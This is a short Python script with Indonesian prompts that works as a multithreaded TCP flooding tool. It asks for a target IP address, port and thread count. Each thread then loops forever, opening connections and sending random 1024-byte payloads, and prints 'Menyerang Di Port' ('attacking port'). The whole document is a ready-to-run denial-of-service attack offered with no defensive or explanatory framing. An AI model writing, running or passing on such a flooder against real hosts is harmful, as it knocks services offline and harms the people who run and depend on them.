import socket
import random
import string
import threading

target_ip = input("Masukan Alamat IP Target: ")
target_port = int(input("Masukan Port Target: "))
threads = int(input("Threads (1,2,3...) :"))

def attack():
    while True:
        try:
            byte_message = random._urandom(1024)
            opened_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            opened_socket.connect((target_ip, target_port))
            opened_socket.send(byte_message)
            for d in range(10):
                opened_socket.send(byte_message)

            print("Menyerang Di Port :",target_port)
        except OSError as identifier:
            opened_socket.close()
            print("Gagal Di Port :",target_port)
            pass
        
       
for y in range(threads):
    th = threading.Thread(target = attack)
    th.start()